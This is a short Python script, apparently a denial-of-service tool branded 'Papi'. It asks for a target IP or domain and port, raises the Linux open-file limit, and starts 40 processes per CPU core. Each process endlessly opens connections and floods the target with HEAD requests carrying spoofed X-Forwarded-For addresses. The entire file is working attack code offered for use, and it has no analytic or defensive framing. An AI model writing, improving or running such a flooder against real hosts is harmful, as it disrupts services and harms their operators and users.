import socket
import os
import multiprocessing
import random
import platform
from time import sleep

print("Detecting System...")
sysOS = platform.system()
print("System detected:", sysOS)

if sysOS == "Linux":
    try:
        os.system("ulimit -n 1030000")
    except Exception as e:
        print(e)
        print("Could not start the script")
else:
    print("Your system is not Linux, You may not be able to run this script in some systems")

def randomip():
    randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return randip

def attack(ip, port, url):
    connection = "Connection: null\r\n"
    referer = "Referer: null\r\n"
    forward = "X-Forwarded-For: " + randomip() + "\r\n"
    get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
    request = get_host + referer + connection + forward + "\r\n\r\n"
    while True:
        try:
            atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            atk.connect((ip, port))
            # Attack starts here
            for _ in range(80):
                atk.send(str.encode(request))
        except socket.error:
            sleep(0)
        except:
            pass

print("Welcome To Papi \n")
ip = input("IP/Domain: ")
port = int(input("Port: "))
url = f"http://{str(ip)}"
print("[>>>] Starting  [<<<]")
sleep(1)

def send2attack():
    num_cores = multiprocessing.cpu_count()
    for _ in range(num_cores * 40): 
        mp = multiprocessing.Process(target=attack, args=(ip, port, url))
        mp.daemon = False
        mp.start()

send2attack()
